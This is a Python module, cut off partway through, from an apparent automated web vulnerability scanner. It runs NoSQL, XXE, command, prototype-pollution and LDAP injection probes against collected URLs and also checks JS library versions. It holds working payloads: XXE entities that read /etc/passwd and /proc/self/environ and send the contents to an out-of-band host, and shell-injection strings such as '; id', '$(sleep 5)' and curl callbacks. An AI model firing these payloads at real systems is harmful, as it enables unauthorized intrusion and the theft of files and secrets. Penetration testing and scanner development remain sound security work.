"""Injection, SSRF, DNS zone transfer, and port scanning phases."""

import asyncio
import json
import re
import shlex
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from vulnforge.config import _SAFE_HOST
from vulnforge.phases.helpers import (
    _SKIP_PARAMS,
    PhaseSet,
    _is_static_url,
    _run_cmd_clear_proxy,
)
from vulnforge.process import (
    _PIPELINE_CFG,
    _run,
)
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _extra_headers_dict,
    _get_urlopener,
    _safe_name,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)

_NOSQLI_PAYLOADS: List[Dict[str, Any]] = [
    {"$gt": ""},
    {"$ne": ""},
    {"$gt": "admin"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    {"$ne": "nonexistent"},
    {"$in": ["admin", "true"]},
]
_NOSQLI_PARAMS = {
    "username",
    "user",
    "pass",
    "password",
    "email",
    "token",
    "id",
    "role",
    "admin",
    "name",
}
_NOSQLI_OPERATOR_MARKERS = (
    "unexpected token",
    "unexpected string",
    "unexpected character",
    "$where",
    "$regex",
    "operator",
    "invalid query",
    "bad query",
    "mongoerror",
    "cannot query",
    "cast to objectid",
    "expected a string",
    "syntax error",
    "illegal",
)


def _oob_callback_identifiers(outdir: Path) -> List[str]:
    identifiers: List[str] = []
    log_file = outdir / "logs" / "interactsh.log"
    if not log_file.exists():
        return identifiers
    for ln in read_lines(log_file):
        ln = ln.strip()
        if not ln.startswith("{"):
            continue
        try:
            ev = json.loads(ln)
        except ValueError:
            continue
        uid = ev.get("unique-id") or ev.get("id")
        if uid:
            identifiers.append(str(uid))
        if "full-url" in ev:
            identifiers.append(str(ev["full-url"]))
        if "q" in ev:
            identifiers.append(str(ev["q"]))
    return identifiers


async def phase_22_NOSQLI(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"22-NOSQLI"}:
        return {}
    _out = outdir / "nosqli.txt"
    if _out.exists() and not force:
        return {"22-NOSQLI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 22-NOSQLI: NoSQL injection probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "22-NOSQLI: no URLs; skipping")
        return {"22-NOSQLI": str(_out), "count": 0}
    findings: List[str] = []
    _n_urlopen = _get_urlopener()
    _n_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_nosqli
    ]
    _NOSQLI_BASELINE_KEYWORDS = {"mongodb", "mongo", "nosql", "cast", "objectid"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_body_lower = ""
        try:
            base_req = urllib.request.Request(
                u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
            )
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            baseline_body_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        for param_name in qs:
            if param_name.lower() not in _NOSQLI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _NOSQLI_PAYLOADS:
                try:
                    await _throttle_rate()
                    test_qs = qs.copy()
                    test_qs[param_name] = [json.dumps(payload)]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
                    )
                    ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = ns_body.decode("utf-8", errors="ignore").lower()
                    if ns_status in (200, 201) and body != baseline_body_lower:
                        findings.append(
                            f"[nosqli-payload] {test_url} param={param_name} payload={json.dumps(payload)} (body changed from baseline)"
                        )
                        break
                    if ns_status in (500, 400):
                        baseline_new_kw = {
                            w
                            for w in _NOSQLI_BASELINE_KEYWORDS
                            if w in body and w not in baseline_body_lower
                        }
                        if baseline_new_kw:
                            findings.append(
                                f"[nosqli-error] {test_url} param={param_name} payload={json.dumps(payload)} → HTTP {ns_status} keywords={baseline_new_kw}"
                            )
                            break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    # Also probe JSON API endpoints with NoSQL bodies
    api_targets = [
        u.split("?")[0] for u in all_urls if "/api/" in u.lower() and not _is_static_url(u)
    ][: _PIPELINE_CFG.sample_urls_nosqli]
    for u in api_targets:
        api_baseline = ""
        try:
            base_req = urllib.request.Request(
                u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
            )
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            api_baseline = base_bytes.decode("utf-8", errors="ignore").lower()
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        for payload in _NOSQLI_PAYLOADS:
            try:
                await _throttle_rate()
                body_data = json.dumps({"username": payload, "password": {"$ne": ""}}).encode()
                req = urllib.request.Request(
                    u,
                    data=body_data,
                    method="POST",
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                        **_n_extra_headers,
                    },
                )
                ns_status, _, ns_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                ns_body_text = ns_body.decode("utf-8", errors="ignore").lower()
                if ns_status in (200, 201) and ns_body_text != api_baseline:
                    findings.append(
                        f"[nosqli-json] POST {u} payload={json.dumps(payload)} → HTTP {ns_status} (body changed)"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
    # Firebase REST endpoint discovery
    firebase_targets = [
        u.split("?")[0]
        for u in all_urls
        if ".firebaseio.com" in u.lower() or "firestore" in u.lower()
    ]
    for u in firebase_targets[: _PIPELINE_CFG.sample_urls_nosqli]:
        for ep in ("/.json", ""):
            try:
                fb_url = u.rstrip("/") + ep
                req = urllib.request.Request(
                    fb_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
                )
                fb_status, _, fb_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                fb_text = fb_body.decode("utf-8", errors="ignore")
                if fb_status == 200 and fb_text.strip() and "error" not in fb_text.lower():
                    findings.append(
                        f"[nosqli-firebase] {fb_url} → HTTP {fb_status} (accessible Firebase ref)"
                    )
            except Exception:
                continue
    # CouchDB endpoint discovery
    couch_targets = [
        u.split("?")[0] for u in all_urls if "couchdb" in u.lower() or "cloudant" in u.lower()
    ]
    for u in couch_targets[: _PIPELINE_CFG.sample_urls_nosqli]:
        for ep in ("/_all_docs", "/_users"):
            try:
                cd_url = u.rstrip("/") + ep
                req = urllib.request.Request(
                    cd_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
                )
                cd_status, _, cd_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                cd_text = cd_body.decode("utf-8", errors="ignore")
                if cd_status == 200 and "total_rows" in cd_text:
                    findings.append(
                        f"[nosqli-couchdb] {cd_url} → HTTP {cd_status} (accessible CouchDB endpoint)"
                    )
            except Exception:
                continue
    # PHP-style MongoDB $where injection via URL-encoded parameter names
    _MONGODB_WHERE_PARAMS = {
        "username",
        "user",
        "pass",
        "password",
        "email",
        "token",
        "id",
        "search",
        "query",
        "name",
    }
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        try:
            base_req = urllib.request.Request(
                u, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
            )
            _, _, base_bytes = await _async_urlopen(_n_urlopen, base_req, timeout=10)
            baseline_body = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            baseline_body = ""
        for param_name in qs:
            if param_name.lower() not in _MONGODB_WHERE_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for op in ("$where", "$regex"):
                test_qs = qs.copy()
                nk = f"{param_name}[{op}]"
                test_qs[nk] = ["1" if op == "$where" else ".*"]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_n_extra_headers}
                    )
                    mongo_status, _, mongo_body = await _async_urlopen(_n_urlopen, req, timeout=10)
                    body = mongo_body.decode("utf-8", errors="ignore").lower()
                    if mongo_status in (200, 201) and body != baseline_body:
                        findings.append(
                            f"[nosqli-php-mongo] {test_url} param={nk} ({op}) → HTTP {mongo_status} (body changed)"
                        )
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"22-NOSQLI: {len(findings)} NoSQL injection probes → {out}")
    return {"22-NOSQLI": str(out), "count": len(findings)}


async def phase_25_XXE(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    oast_domain: Optional[str],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"25-XXE"}:
        return {}
    _out = outdir / "xxe.txt"
    if _out.exists() and not force:
        return {"25-XXE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 25-XXE: XML external entity injection probes")
    findings: List[str] = []
    _x_urlopen = _get_urlopener()
    _xxe_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "25-XXE: no URLs; skipping")
        return {"25-XXE": str(_out), "count": 0}
    targets = [u.split("?")[0] for u in all_urls][: _PIPELINE_CFG.sample_urls_xxe]
    oast_ref = oast_domain or "burpcollaborator.net"
    _xxe_p1 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
    _xxe_p2 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>"""
    _xxe_p3 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "http://{oast_ref}/xxe-oob"> %test;]><root/>"""
    _xxe_p4 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_ref}/xxe?data=%file;'>">%eval;%exfil;]><root/>"""
    _xxe_p5 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>"""
    _xxe_p6 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>"""
    _xxe_p7 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oast_ref}/xxe-blind"> %xxe;]><root/>"""
    _xxe_p8 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://{oast_ref}/evil.dtd">%dtd;]><root/>"""
    _xxe_p9 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>"""
    _xxe_p10 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>"""
    _xxe_p11 = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://input">]><root>&xxe;</root>"""
    # SVG XXE
    _xxe_p12 = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>"""
    # XInclude
    _xxe_p13 = """<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>"""
    # Blind XXE with OAST
    _xxe_p14 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oast_ref}/xxe-blind-oob"> %xxe;]><root/>"""
    # Parameter entity OOB with data exfiltration
    _xxe_p15 = f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % payload "file:///etc/passwd"> <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://{oast_ref}/xxe-data?data=%payload;'>"> %param1;]><root/>"""
    # UTF-7 WAF bypass
    _xxe_p16 = """<?xml version="1.0" encoding="UTF-7"?>+ADw?xml version+ACIAIQ-1.0+ACI- encoding+AD0AIg-UTF-7+ACI-?AD4+ADw-DOCTYPE root+AFs+ADw-ENTITY xxe SYSTEM+ACI-file:///etc/passwd+ACI-+AD4AXQ+AD4-+ADw-root+AD4-+ADw-&xxe;-+AD4-+ADw-/root+AD4-"""
    xxe_payloads = [
        _xxe_p1,
        _xxe_p2,
        _xxe_p3,
        _xxe_p4,
        _xxe_p5,
        _xxe_p6,
        _xxe_p7,
        _xxe_p8,
        _xxe_p9,
        _xxe_p10,
        _xxe_p11,
        _xxe_p12,
        _xxe_p13,
        _xxe_p14,
        _xxe_p15,
        _xxe_p16,
    ]

    async def _probe_xxe(url: str) -> List[str]:
        results: List[str] = []
        for i, payload in enumerate(xxe_payloads):
            try:
                req = urllib.request.Request(
                    url,
                    data=payload.encode("utf-8"),
                    method="POST",
                    headers={
                        "Content-Type": "application/xml",
                        "User-Agent": "Mozilla/5.0",
                        **_xxe_extra_headers,
                    },
                )
                xs, _, xb = await _async_urlopen(_x_urlopen, req, timeout=10)
                body = xb.decode("utf-8", errors="ignore")
                xxe_indicators = [
                    "root:x:0:0",
                    "root:*:",
                    "php://filter",
                    "ENTITY",
                    'SYSTEM "file://',
                ]
                if any(ind in body for ind in xxe_indicators):
                    results.append(f"[xxe-candidate] {url} payload={i} HTTP {xs}")
                    break
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="ignore")
                    xxe_indicators = ["root:x:0:0", "root:*:", "ENTITY", 'SYSTEM "file://']
                    if any(ind in body for ind in xxe_indicators):
                        results.append(f"[xxe-error-reflected] {url} payload={i} HTTP {e.code}")
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        return results

    xxe_results = await asyncio.gather(*[_probe_xxe(t) for t in targets])
    for xr in xxe_results:
        findings.extend(xr)
    if not findings:
        findings.append("[xxe] No XXE candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"25-XXE: {len(findings)} XXE probe findings → {out}")
    return {"25-XXE": str(out), "count": len(findings)}


_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "| whoami",
    "; ping -c 1 127.0.0.1",
    "| nslookup example.com",
    "& echo ${PATH}",
    # Time-based
    "; sleep 5",
    "| ping -c 5 127.0.0.1",
    # Filter-bypass sequences
    "%0a id",
    "; ls -la",
    "ls%09-la",
]
_CMDI_PARAMS = {
    "host",
    "ping",
    "domain",
    "server",
    "ip",
    "target",
    "url",
    "path",
    "cmd",
    "command",
    "exec",
    "shell",
    "dir",
    "folder",
    "file",
}


async def phase_26_CMDINJECT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    oast_domain: Optional[str] = None,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"26-CMDINJECT"}:
        return {}
    _out = outdir / "cmd_injection.txt"
    if _out.exists() and not force:
        return {"26-CMDINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 26-CMDINJECT: OS command injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "26-CMDINJECT: no URLs; skipping")
        return {"26-CMDINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _cmdi_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_cmdi
    ]
    if t.has("commix") and param_urls:
        commix_outdir = outdir / "logs" / "commix"
        commix_outdir.mkdir(parents=True, exist_ok=True)
        for u in param_urls:
            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(u)}\n"
                f"OUT={shlex.quote(str(commix_outdir))}\n"
                'commix -u "$URL" --batch --output-dir="$OUT" < /dev/null\n'
            )
            runner.chmod(0o700)
            await _run(
                f"commix-{_safe_name(u)}",
                ["bash", str(runner)],
                600,
                outdir,
            )
        commix_reports = list(commix_outdir.glob("**/*.txt"))
        if commix_reports:
            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CMDI_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers}
                    )
                    _, _, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    indicators = [
                        "uid=",
                        "gid=",
                        "groups=",
                        "linux",
                        "darwin",
                        "www-data",
                        "root:",
                        "bin/",
                        "microsoft",
                        "windows",
                        "nt authority",
                        "command not found",
                        "not recognized",
                    ]
                    if any(ind in body.lower() for ind in indicators):
                        findings.append(
                            f"[cmdi-candidate] {test_url} param={param_name} payload={payload}"
                        )
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    # Time-based detection
    import time as _cmdi_time

    _TIME_PAYLOADS = [
        ("; sleep 5", 4.0),
        ("| ping -c 5 127.0.0.1", 4.0),
        ("`sleep 5`", 4.0),
        ("$(sleep 5)", 4.0),
    ]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, min_seconds in _TIME_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers}
                    )
                    start = _cmdi_time.time()
                    try:
                        await _async_urlopen(_c_urlopen, req, timeout=int(max(min_seconds + 3, 10)))
                    except Exception:
                        pass
                    elapsed = _cmdi_time.time() - start
                    if elapsed >= min_seconds * 0.8:
                        findings.append(
                            f"[cmdi-time-delay] {test_url} param={param_name} payload={payload} delay={elapsed:.1f}s"
                        )
                except Exception:
                    continue
    # OOB-based detection via nslookup/curl to OAST
    if oast_domain and _SAFE_HOST.match(oast_domain):
        _OOB_PAYLOADS = [
            f"; nslookup {oast_domain}.{oast_domain}",
            f"| nslookup {oast_domain}.{oast_domain}",
            f"; curl http://{oast_domain}/cmdi-oob",
            f"| curl http://{oast_domain}/cmdi-oob",
        ]
        for u in param_urls[: _PIPELINE_CFG.sample_urls_fuzz]:
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                continue
            for param_name in qs:
                if param_name.lower() not in _CMDI_PARAMS:
                    continue
                if param_name.lower() in _SKIP_PARAMS:
                    continue
                for payload in _OOB_PAYLOADS:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        req = urllib.request.Request(
                            test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers}
                        )
                        await _async_urlopen(_c_urlopen, req, timeout=10)
                        findings.append(
                            f"[cmdi-oob] {test_url} param={param_name} (check {oast_domain} for callback)"
                        )
                    except Exception:
                        continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"26-CMDINJECT: {len(findings)} command injection probes → {out}")
    return {"26-CMDINJECT": str(out), "count": len(findings)}


async def phase_27_SSPP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"27-SSPP"}:
        return {}
    _out = outdir / "sspp.txt"
    if _out.exists() and not force:
        return {"27-SSPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 27-SSPP: server-side prototype pollution probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "27-SSPP: no URLs; skipping")
        return {"27-SSPP": str(_out), "count": 0}
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _sspp_extra_headers = _extra_headers_dict()
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][
        : _PIPELINE_CFG.sample_endpoints_sspp
    ]
    sspp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"is_admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": "active"}},
    ]
    for u in api_targets:
        for payload in sspp_payloads:
            try:
                body_data = json.dumps(payload).encode()
                req = urllib.request.Request(
                    u,
                    data=body_data,
                    method="POST",
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0",
                        **_sspp_extra_headers,
                    },
                )
                ss, _, sb = await _async_urlopen(_s_urlopen, req, timeout=10)
                if ss in (200, 201, 302):
                    findings.append(
                        f"[sspp-candidate] POST {u} payload={json.dumps(payload)} → HTTP {ss}"
                    )
            except urllib.error.HTTPError as e:
                if 500 <= e.code < 600:
                    findings.append(
                        f"[sspp-crash-candidate] POST {u} payload={json.dumps(payload)} → HTTP {e.code}"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
    if not findings:
        findings.append("[sspp] No prototype pollution candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"27-SSPP: {len(findings)} prototype pollution probes → {out}")
    return {"27-SSPP": str(out), "count": len(findings)}


_DEP_CHECK_PATTERNS: List[Tuple[str, str, str, str]] = [
    (
        "jquery",
        r"jquery[.-]?([\d.]+)",
        "3.5.0",
        "CVE-2020-11022/CVE-2020-11023 (XSS in htmlPrefilter)",
    ),
    (
        "angular",
        r"angular[.-]?([\d.]+)",
        "1.8.4",
        "CVE-2022-25869 (XSS via IE page caching; angular EOL, no fixed version)",
    ),
    ("react", r"react[.-]?([\d.]+)", "16.14.0", "outdated (no tracked core react CVE)"),
    (
        "lodash",
        r"lodash[.-]?([\d.]+)",
        "4.17.21",
        "CVE-2021-23337 (prototype pollution via defaultsDeep)",
    ),
    ("vue", r"vue[.-]?([\d.]+)", "2.7.0", "outdated (Vue 2 EOL; no tracked core CVE)"),
    ("moment", r"moment[.-]?([\d.]+)", "2.29.4", "CVE-2022-24785 (ReDoS)"),
    (
        "bootstrap",
        r"bootstrap[.-]?([\d.]+)",
        "4.3.1",
        "CVE-2019-8331 (XSS in tooltip/popover data-template)",
    ),
    (
        "express",
        r"express[.-]?([\d.]+)",
        "4.17.3",
        "CVE-2022-24999 (prototype poisoning via bundled qs < 6.10.3)",
    ),
]


def _parse_semver(ver: str) -> Optional[Tuple[int, int, int]]:
    parts = ver.split(".")
    if len(parts) >= 3 and all(p.isdigit() for p in parts[:3]):
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    if len(parts) >= 2 and all(p.isdigit() for p in parts[:2]):
        return (int(parts[0]), int(parts[1]), 0)
    return None


def _semver_lt(v1: Tuple[int, int, int], v2: Tuple[int, int, int]) -> bool:
    return v1 < v2


async def phase_29_DEPCHECK(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"29-DEPCHECK"}:
        return {}
    _out = outdir / "depcheck.txt"
    if _out.exists() and not force:
        return {"29-DEPCHECK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 29-DEPCHECK: JS dependency vulnerability scanning")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _dc_extra_headers = _extra_headers_dict()
    js_urls = outdir / "urls_js.txt"
    all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        await asyncio.sleep(3)
        all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        log("warn", "29-DEPCHECK: no JS URLs; skipping")
        return {"29-DEPCHECK": str(_out), "count": 0}
    scanned = 0
    seen_deps: Set[str] = set()
    for js_url in all_js[: _PIPELINE_CFG.sample_urls_depcheck]:
        try:
            req = urllib.request.Request(
                js_url, headers={"User-Agent": "Mozilla/5.0", **_dc_extra_headers}
            )
            _, _, body_bytes = await _async_urlopen(_d_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            scanned += 1
            for dep_name, pattern, safe_ver_str, advisory in _DEP_CHECK_PATTERNS:
                for m in re.finditer(pattern, body, re.IGNORECASE):
                    ver = m.group(1)
                    cache_key = f"{dep_name}@{ver}"
                    if cache_key in seen_deps:
                        continue
                    seen_deps.add(cache_key)
                    parsed = _parse_semver(ver)
                    safe_ver = _parse_semver(safe_ver_str)
                    if parsed and safe_ver and _semver_lt(parsed, safe_ver):
                        findings.append(f"[outdated] {dep_name} v{ver} in {js_url} — {advisory}")
                    else:
                        findings.append(f"[dep] {dep_name} v{ver} in {js_url} (current)")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    findings.append(
        f"[depcheck] scanned {scanned} JS files, {len(seen_deps)} unique dependencies found"
    )
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"29-DEPCHECK: {len(findings)} dependency findings → {out}")
    return {"29-DEPCHECK": str(out), "count": len(findings)}


async def phase_42_LDAP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"42-LDAP"}:
        return {}
    _out = outdir / "ldap_injection.txt"
    if _out.exists() and not force:
        return {"42-LDAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 42-LDAP: LDAP injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "42-LDAP: no URLs; skipping")
        return {"42-LDAP": str(_out), "count": 0}
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_ldap
    ]
    _LDAP42_PAYLOADS = [
        "*",
        "*)(uid=*))",
        "*)(|(uid=*",
        "admin*",
        "*|uid=*",
        "*((uid=*",
        "*)(uid=*",
    ]
    _LDAP42_SPECIFIC = [
        "javax.naming",
        "ldapexception",
        "ldap_error",
        "invalid dn syntax",
        "ldap_no_such_object",
        "operationserror",
        "invalidcredentials",
        "ldap_result_entry",
        "com.sun.jndi.ldap",
    ]
    _LDAP42_GENERIC_BASELINE = {
        "error",
        "syntax",
        "malformed",
        "bad search filter",
        "protocol error",
    }
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(
                u, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers}
            )
            _, _, base_bytes = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP42_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers}
                    )
                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP42_SPECIFIC):
                        findings.append(
                            f"[ldap-candidate] {test_url} param={pname} payload={payload}"
                        )
                        break
                    generic_new = {
                        w for w in _LDAP42_GENERIC_BASELINE if w in body and w not in baseline_lower
                    }
                    if generic_new:
                        findings.append(
                            f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}"
                        )
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[ldap] No LDAP injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"42-LDAP: {len(findings)} LDAP probes -> {out}")
